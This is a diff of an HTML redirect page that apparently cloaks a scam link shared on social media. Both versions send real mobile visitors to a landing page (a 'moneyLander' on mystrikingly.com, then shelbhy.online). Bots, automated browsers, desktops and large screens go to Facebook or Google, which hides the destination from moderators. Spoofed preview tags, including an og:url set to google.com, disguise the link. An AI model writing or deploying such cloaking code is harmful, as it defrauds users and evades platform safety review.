@@ -3,49 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- Social Preview Tags -->
-    <meta property="og:title" content="💜 ❤️💜❤️💜❤️💜">
-    <meta property="og:description" content="💜 ❤️💜❤️💜">
+    <title>Welcome</title>
+
+    <meta property="og:title" content="❤️💚🧡">
+    <meta property="og:description" content="">
     <meta property="og:image" content="https://raw.githubusercontent.com/sabirsadrosadro-droid/Ticn-/refs/heads/main/2.gif">
-    <meta property="og:image:width" content="500">
-    <meta property="og:image:height" content="500">
+    <meta property="og:url" content="https://www.google.com">
     <meta property="og:type" content="website">
 
     <script>
-        // Redirect URLs
-        const safeRedirect = "web.facebook.com";
-        const moneyLander = "https://logical-azalea-11x992b.mystrikingly.com/";
+    document.addEventListener('DOMContentLoaded', function() {
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        var screenWidth = window.innerWidth;
 
-        const ua = navigator.userAgent.toLowerCase();
-        
-        // 1. Screen Width Check (490px se badi har screen tablet/laptop mani jayegi)
-        const isLargeScreen = window.innerWidth > 490;
-
-        // 2. Known Bots Check
-        const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
-        const isAutomated = navigator.webdriver === true;
-
-        // 3. Hardware / Sensor Layer
-        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-
-        // 4. Device Logic
-        const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
-        const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
-
-        // FINAL FILTER
-        if (isLargeScreen) {
-            // Agar screen 490px se ek pixel bhi badi hui, toh seedha safe page
-            window.location.replace(safeRedirect);
-        } else if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
-            window.location.replace(safeRedirect);
-        } else if (isMobileOrTablet && hasTouchSupport) {
-            window.location.replace(moneyLander);
+        if (isMobile || screenWidth <= 768) {
+            window.location.href = "https://shelbhy.online/news/049n";
         } else {
-            window.location.replace(safeRedirect);
+            window.location.href = "https://www.google.com/";
         }
+    });
     </script>
 </head>
-<body style="background-color: #ffffff;">
+<body>
 </body>
 </html>
